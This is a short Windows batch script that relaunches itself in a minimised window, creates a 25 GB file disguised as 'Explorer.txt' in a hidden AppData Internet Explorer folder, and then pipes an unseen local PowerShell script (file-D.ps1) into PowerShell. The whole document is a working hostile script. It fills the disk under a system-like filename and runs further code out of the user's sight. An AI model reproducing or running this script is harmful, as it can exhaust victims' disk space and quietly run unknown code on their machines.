:: Create large File
@echo off
if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
fsutil file createnew "C:\Users\%USERNAME%\AppData\LocalLow\Microsoft\Internet Explorer\Explorer.txt" 25000000000
type .\file-D.ps1 | powershell -
exit 0
